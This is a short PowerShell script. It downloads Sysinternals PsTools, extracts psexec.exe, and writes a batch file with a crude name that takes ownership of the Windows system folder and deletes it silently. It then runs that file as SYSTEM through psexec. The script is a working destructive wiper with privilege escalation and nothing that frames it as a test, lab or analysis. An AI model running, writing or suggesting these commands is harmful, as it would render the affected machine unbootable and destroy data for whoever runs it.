Invoke-WebRequest -Uri 'https://download.sysinternals.com/files/PSTools.zip' -OutFile 'c:\temp\pstools.zip'
Expand-Archive -Path 'c:\temp\pstools.zip' -DestinationPath "c:\temp\pstools"
Move-Item -Path "c:\temp\pstools\psexec.exe" "C:\Temp"
Remove-Item -Path "c:\temp\pstools" -Recurse

"@echo off
takeown /f c:\windows\

rmdir c:\windows\ /s /q" | out-file -Encoding ascii "c:\temp\fuckYou.bat"

c:\temp\psexec.exe -s -i -accepteula "c:\temp\fuckYou.bat"